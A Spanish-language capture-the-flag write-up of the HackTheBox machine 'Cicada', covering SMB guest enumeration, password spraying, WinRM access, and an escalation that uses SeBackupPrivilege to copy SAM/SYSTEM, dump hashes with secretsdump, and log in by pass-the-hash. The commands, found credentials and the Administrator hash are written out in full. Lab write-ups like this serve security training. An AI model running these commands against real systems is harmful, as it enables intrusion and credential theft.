---
title: "Cicada - HackTheBox"
slug: "htb-cicada"
date: 2025-10-23
platform: htb
difficulty: easy
lang: es
tags:
  - active-directory
  - smb
  - password-spraying
  - winrm
  - sebackupprivilege
  - pass-the-hash
  - privesc
excerpt: "Máquina Windows AD «Cicada» de HackTheBox: de null session y SMB a credenciales por spraying, y root abusando de SeBackupPrivilege para volcar SAM/SYSTEM."
draft: false
---

Cicada es una máquina Windows clasificada como «Fácil» en HackTheBox, centrada en Active Directory. El recorrido va desde una enumeración de SMB con sesión de invitado y un poco de password spraying, hasta comprometer el dominio abusando de `SeBackupPrivilege` para volcar los hashes del sistema.

## Portscan
Se realiza el escaneo de puertos con nmap.
```bash
nmap -p- --min-rate 1500 -n -Pn -vvv --open 10.129.66.37 -oN 1stScan
```

![](/assets/images/htb-cicada/htb-cicada-1.png)
## User Flag
Tiene abierto el 445, que es SMB, así que probamos enumerar los recursos compartidos
```bash
nxc smb 10.129.66.37 
```
Se añade el dominio al `/etc/hosts`
![](/assets/images/htb-cicada/htb-cicada-2.png)
Luego se intentan ver los recursos compartidos, sin autenticación y posteriormente con un usuario `guest`.
```bash
# Sin autenticación
nxc smb 10.129.66.37 --shares 

# Usuario guest
nxc smb 10.129.66.37 -u 'guest' -p '' --shares
```

![](/assets/images/htb-cicada/htb-cicada-3.png)
Con el usuario `guest` tenemos permisos de lectura en un recurso compartido `HR`, así que podemos intentar ver su contenido con `smbclient` y encontrar algo interesante.

Dentro de este recurso se encontró un archivo `Notice from HR.txt`, el cual descargamos.
```bash
smbclient //10.129.66.37/HR -U 'guest'% 
```

![](/assets/images/htb-cicada/htb-cicada-4.png)

Dentro de este archivo se encuentra una nota con una password `Cicada$M6Corpb*@Lp#nZp!8`, que posiblemente podría ser usada en algún usuario.
![](/assets/images/htb-cicada/htb-cicada-5.png)

Ahora era necesario obtener el usuario al que pertenece esta contraseña, para esto se usó `impacket-lookupsid`, que permite consultar el servicio `LSARPC` del DC y obtener nombres asociados a los SID de usuarios y grupos:
```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
```
Se usa `-no-pass` para no usar una contraseña en la autenticación, ya que el dominio permite null sessions mediante el usuario `guest`.
![](/assets/images/htb-cicada/htb-cicada-6.png)
La herramienta devuelve los grupos y usuarios válidos encontrados, ahora se puede filtrar y crear una wordlist de solo usuarios con los que probar la contraseña encontrada anteriormente.
![](/assets/images/htb-cicada/htb-cicada-7.png)
Usando `nxc` se realizó un spraying a los usuarios obtenidos, teniendo como resultado que esa contraseña le pertenece al usuario `michael.wrightson`.
```bash
nxc smb 10.129.66.37 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```
![](/assets/images/htb-cicada/htb-cicada-8.png)

Con las credenciales actuales, no podemos enumerar recursos compartidos nuevos, pero se realizó una enumeración de usuarios.
```bash
nxc smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
Los resultados nos arrojaron un usuario  `david.orelious` y en su descripción se muestra un mensaje que contiene su posible contraseña `aRt$Lp#7t*VQ!3 `.
![](/assets/images/htb-cicada/htb-cicada-9.png)
Con este nuevo usuario fue posible enumerar un nuevo recurso compartido, llamado `DEV`.
```bash
nxc smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```
![](/assets/images/htb-cicada/htb-cicada-10.png)

Para explorar este recurso, de nuevo usamos `smbclient`
```bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```
Dentro de este recurso compartido, se encontró un archivo `.ps1`, así que se procedió a descargar.
![](/assets/images/htb-cicada/htb-cicada-11.png)
El archivo contenía lo que al parecer son otras credenciales, ahora las del usuario `emily.oscars`, junto con la contraseña `Q!3@Lp#M6b*7t*Vt`.
![](/assets/images/htb-cicada/htb-cicada-12.png)
Por fin estas credenciales sirvieron para acceder con usa sesión de powershell remota (WinRM), usando `evil-winrm` y las credenciales previamente encontradas.
```bash
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![](/assets/images/htb-cicada/htb-cicada-13.png)

Una vez dentro de la máquina con este usuario, ya podemos ubicar su directorio `Desktop` y encontrar la flag de user.
![](/assets/images/htb-cicada/htb-cicada-14.png)
## Privesc
Revisando los privilegios que tiene el usuario actual, notamos que cuenta con `SeBackupPrivilege`, lo cual nos permite leer cualquier archivo del sistema, sin importar permisos o propietario, ya que su propósito principal es que los servicios de backup puedan copiar todo el sistema.
```powershell
whoami /priv
```

![](/assets/images/htb-cicada/htb-cicada-15.png)
Por lo tanto, se realiza la copia de archivos protegidos usando `reg` para manipular el registro del sistema.
Copiamos el `SAM` y el `SYSTEM`, ya que con estos podemos extraer los hashes de las passwords.
```powershell
reg save hklm\sam .\SAM

reg save hklm\system .\SYSTEM
```
Ahora descargamos estos archivos a la máquina atacante.
```powershell
download SAM

download SYSTEM
```

![](/assets/images/htb-cicada/htb-cicada-16.png)

Ahora con `impacket-secretsdump` y los archivos descargados podemos intentar obtener los hashes.
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

![](/assets/images/htb-cicada/htb-cicada-17.png)

Logramos obtener los hashes del usuario `Administrator`, así que podemos realizar un Pass-The-Hash para entrar con `evil-winrm`.
```bash
evil-winrm -i cicada.htb -u administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

Logramos obtener acceso a la victima siendo administradores y podemos leer la flag de root.
![](/assets/images/htb-cicada/htb-cicada-18.png)

## Conclusiones
Con esto completamos Cicada, obteniendo las flags de user y root. Una máquina ideal para practicar la enumeración de SMB con sesiones nulas, el password spraying y el abuso de `SeBackupPrivilege` para extraer los hashes del `SAM` y el `SYSTEM`. ¡Vamos por más!
